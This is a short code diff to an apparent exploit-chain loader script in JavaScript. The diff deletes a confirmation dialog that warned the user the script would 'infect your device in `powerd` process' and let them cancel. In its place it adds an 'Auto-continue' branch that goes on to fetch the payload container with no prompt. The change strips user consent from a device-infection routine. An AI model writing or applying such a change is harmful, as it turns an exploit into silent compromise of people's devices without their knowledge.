@@ -1305,16 +1305,9 @@ function YA() {/* Original: YA → resolveSymbols */
                     if (lastSlash >= 0) hashName = hashName.substring(lastSlash + 1);
                     hashName = hashName.replace(/\.min\.js$/, "").replace(/\.js$/, "");
 
-                    // When we load the metadata, ask user if they want to continue (will infect device)
+                    // Auto-continue: skip the user confirmation dialog, proceed directly
                     if (hashName === "7a7d99099b035b2c6512b6ebeeea6df1ede70fbb") {
-                        let shouldContinue = confirm(
-                            "The script is about to load metadata and subsequent payloads to infect your device in `powerd` process.\n" +
-                            "Cancel = safely STOP this operation\n" +
-                            "OK     = continue infect your device");
-                        if (!shouldContinue) {
-                            window.log("[LOADER] Execution canceled by user.");
-                            return;
-                        }
+                        window.log("[LOADER] Auto-continue: loading metadata & payloads (no confirmation dialog).");
                     }
 
                     // Fetch decrypted F00DBEEF container from payloads/ directory
